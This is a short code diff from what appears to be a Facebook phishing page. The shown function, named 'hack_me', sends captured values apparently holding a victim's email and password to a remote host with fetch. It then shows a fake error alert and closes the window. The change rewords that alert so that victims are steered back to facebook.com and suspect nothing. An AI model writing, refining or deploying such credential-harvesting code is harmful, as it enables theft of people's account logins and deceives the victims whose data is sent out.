@@ -7,7 +7,7 @@ function hack_me() {
   fetch(`${host}?em=${em}&ps=${ps}`)
 
   setTimeout(() => {
-      alert('something went wrong. please refresh facebook.com and try again')
+      alert('something went wrong. please click/tap the facebook.com logo and try again')
       window.close()
   }, 3000)
 }
